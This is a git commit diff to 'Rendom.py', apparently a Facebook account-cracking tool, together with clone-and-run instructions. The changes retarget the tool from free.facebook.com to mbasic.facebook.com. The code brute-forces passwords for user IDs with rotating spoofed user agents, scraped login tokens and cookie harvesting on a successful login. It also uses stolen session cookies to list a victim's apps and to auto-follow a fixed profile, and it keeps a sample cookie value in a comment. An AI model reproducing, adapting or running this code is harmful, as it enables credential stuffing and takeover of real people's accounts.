03a6ba4aaaf92892fd70f9230f09f48b883fee28
Nasrat99845 <133340105+Nasrat99845@users.noreply.github.com>
2023-09-16 01:00:52 +0500

    Update Rendom.py
    rm -rf Rendom  
    
    git clone https://github.com/Nasrat99845/Rendom.git
    
     cd Rendom 
    
    python Rendom.py

--- Rendom.py
+++ Rendom.py
@@ -84,7 +84,7 @@ except ModuleNotFoundError:
     os.system('pip install bs4')
     
 def cek_apk(session,coki):
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -96,7 +96,7 @@ def cek_apk(session,coki):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
@@ -110,10 +110,10 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100065533669299', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
+        session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
             
@@ -163,7 +163,7 @@ $$ |\$$$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |
 $$ | \$$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | AFG  
 \__|  \__|\__|  \__| \______/ \__|  \__|\__|  \__|  \__|                                           
 \033[1;37m==============================================
-\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m \33[0;m\033[1;32m & \033[1;33m\33[0;m
+\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m \33[0;m\033[1;32m & ℕ𝔸𝕊ℝ𝔸𝕋\033[1;33m\33[0;m
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m LOY RAYESS KABUL
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNasrat99845.git
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m 
@@ -400,7 +400,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -411,28 +411,29 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;JIHAD";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
+            header_freefb = {
+    'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'sb=FHYDZZGMK254lxEqrqHh51L0; datr=FnYDZZSM_QTDHq9xcsf4bsrM; dpr=3; fr=0WS3CAKErGkP33mhH..BlA3YU.yG.AAA.0.0.BlA4SY.AWXTWMqsegY; wd=980x1982',
+    'dpr': '3',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Microsoft Edge";v="113"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5832.204", "Microsoft Edge";v="113.0.1639.41"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '"TECNO CH7n"',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+            'user-agent': pro}
    
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text,
+            lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
